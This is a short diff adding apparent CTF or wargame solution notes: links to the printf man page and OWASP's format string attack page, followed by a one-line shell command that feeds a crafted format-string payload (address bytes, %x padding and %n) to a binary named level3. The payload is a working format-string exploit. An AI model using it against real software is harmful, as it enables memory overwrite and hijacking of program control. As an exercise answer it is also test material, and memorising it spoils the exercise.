@@ -1,0 +1,4 @@
+https://man7.org/linux/man-pages/man3/printf.3.html
+https://owasp.org/www-community/attacks/Format_string_attack
+
+cat <(python -c 'print "\x08\x04\x98\x8c"[::-1] + "|" + "%x " * 3 + "A" * 37 + "%n"') - | ./level3
